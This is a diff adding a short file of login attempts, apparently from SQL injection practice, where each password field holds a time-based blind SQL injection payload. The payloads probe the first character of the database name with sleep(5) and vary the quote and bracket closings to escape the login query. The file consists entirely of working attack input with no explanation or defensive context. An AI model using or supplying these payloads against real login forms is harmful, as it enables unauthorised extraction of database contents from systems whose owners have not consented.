@@ -1,0 +1,22 @@
+User Name:gegege
+Password:1"') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:gegege
+Password:1" or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- '
+User Name:egge
+Password:1"' or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- '
+User Name:gege
+Password:1' or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- '
+User Name:gege
+Password:1) or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- '
+User Name:gege
+Password:1' or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- '
+User Name:gege
+Password:1'" or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- '
+User Name:fefe
+Password:1'") or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- '
+User Name:gege
+Password:1'") or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:gege
+Password:1' or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:gge
+Password:1" or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
